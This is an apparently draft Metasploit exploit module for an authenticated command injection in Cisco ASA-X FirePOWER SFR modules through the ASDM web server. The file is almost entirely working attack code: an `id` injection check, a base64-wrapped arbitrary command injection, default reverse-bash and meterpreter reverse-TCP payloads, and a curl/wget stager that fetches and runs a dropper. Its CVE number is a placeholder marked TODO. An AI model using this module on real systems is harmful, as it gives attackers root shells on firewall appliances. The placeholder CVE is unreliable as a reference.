##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Cisco ASA-X with FirePOWER Services SFR Module Command Injection',
        'Description' => %q{
          This module exploits a command injection vulnerability affecting Cisco ASA-X
          with FirePOWER Services devices using the on-board SFR module. The attack
          is executed through the ASA's ASDM web server and lands in the SFR module's
          underlying Linux system. This module requires credentials for a user that
          can execute `session sfr do` (the default ASDM admin has sufficient permission)
          and the sfr module must be configured.

          The result of successful exploitation is root access on the SFR module. TODO
          words about this position in the network.

          The following Cisco devices are believed to be affected:

          - Cisco ASA 5506H-X with FirePOWER Services
          - Cisco ASA 5506W-X with FirePOWER Services
          - Cisco ASA 5508-X with FirePOWER Services
          - Cisco ASA 5512-X with FirePOWER Services
          - Cisco ASA 5515-X with FirePOWER Services
          - Cisco ASA 5516-X with FirePOWER Services
          - Cisco ASA 5525-X with FirePOWER Services
          - Cisco ASA 5545-X with FirePOWER Services
          - Cisco ASA 5555-X with FirePOWER Services
          - Cisco ISA-3000-2C2F
          - Cisco ISA-3000-4C
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'jbaines-r7' # Vulnerability discovery and Metasploit module
        ],
        'References' => [
          [ 'CVE', '2022-8888' ], # TODO: the actual CVE #1
        ],
        'DisclosureDate' => '2022-05-30', # disclosure date
        'Platform' => ['unix', 'linux'],
        'Arch' => [ARCH_CMD, ARCH_X64,],
        'Privileged' => true,
        'Targets' => [
          [
            'Shell Dropper',
            {
              'Platform' => 'unix',
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/unix/reverse_bash'
              }
            }
          ],
          [
            'Linux Dropper',
            {
              'Platform' => 'linux',
              'Arch' => [ARCH_X64],
              'Type' => :linux_dropper,
              'CmdStagerFlavor' => [ 'curl', 'wget' ],
              'DefaultOptions' => {
                'PAYLOAD' => 'linux/x64/meterpreter_reverse_tcp'
              }
            }
          ]
        ],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'RPORT' => 443,
          'SSL' => true
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [ARTIFACTS_ON_DISK]
        }
      )
    )
    register_options([
      OptString.new('TARGETURI', [true, 'Base path', '/']),
      OptString.new('USERNAME', [true, 'Username to authenticate with', 'admin']),
      OptString.new('PASSWORD', [true, 'Password to authenticate with', 'labpass1']),
    ])
  end

  def check
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, '/admin/exec/session+sfr+do+`id`'),
      'headers' =>
      {
        'User-Agent' => 'ASDM/ Java/1',
        'Authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD'])
      }
    })
    return CheckCode::Unknown('The target did not respond to the check.') unless res
    return CheckCode::Safe('Authentication failed.') if res.code == 401
    return CheckCode::Unknown("Received unexpected HTTP status code: #{res.code}.") unless res.code == 200

    if res.body.include?('Invalid do command uid=0(root)')
      return CheckCode::Vulnerable("Successfully executed the 'id' command.")
    end

    CheckCode::Safe('The command injection does not appear to work.')
  end

  def execute_command(cmd, _opts = {})
    # base64 encode the payload to work around bad characters and then uri encode
    # the whole thing before yeeting it at the server
    encoded_payload = Rex::Text.uri_encode("(base64 -d<<<#{Rex::Text.encode_base64(cmd)}|sh)&")
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, "/admin/exec/session+sfr+do+`#{encoded_payload}`"),
      'headers' =>
      {
        'User-Agent' => 'ASDM/ Java/1',
        'Authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD'])
      }
    })
    return CheckCode::Unknown('The target did not respond to the check.') unless res
    return CheckCode::Unknown('Authentication failed.') if res.code == 401
    return CheckCode::Unknown("Received unexpected HTTP status code: #{res.code}.") unless res.code == 200
  end

  def exploit
    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")

    case target['Type']
    when :unix_cmd
      execute_command(payload.encoded)
    when :linux_dropper
      execute_cmdstager
    end
  end
end
